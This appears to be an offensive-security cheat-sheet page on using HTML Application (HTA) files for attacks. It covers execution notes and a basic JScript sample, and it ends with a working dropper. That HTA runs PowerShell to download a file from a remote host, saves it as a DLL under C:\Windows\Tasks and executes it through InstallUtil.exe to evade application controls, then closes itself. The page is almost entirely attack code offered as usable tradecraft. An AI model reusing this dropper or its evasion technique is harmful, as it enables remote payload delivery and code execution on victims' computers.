# HTA

## HTA

### About

HTA = html Application

{% hint style="warning" %}
32 bits payload if msha is used.
{% endhint %}

### HTA reminders

* use mshta.exe for execution
* Accept additionnal languages \(ie JScript, VBScript\)
* Once executed, HTA are cached on the disk. Artefact are left on %localappdata%\Microsoft\Windows\INetCache\IE
* Can be mixed with clickonce apps :\)

### Basic sample

```csharp
<script language="JScript">
    var run = new ActiveXObject('WSCRIPT.Shell').Run("C:\\Windows\\system32\\notepad.exe");
</script>
```

### Dropper

#### Download base64 dll and execute it using installutils

```csharp
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell (new-object net.webclient).downloadfile('http://192.168.1.10/stcreat.txt','C:\\Windows\\Tasks\\stcreat.dll') ; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /url C:\\Windows\\Tasks\\stcreat.dll");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>


```

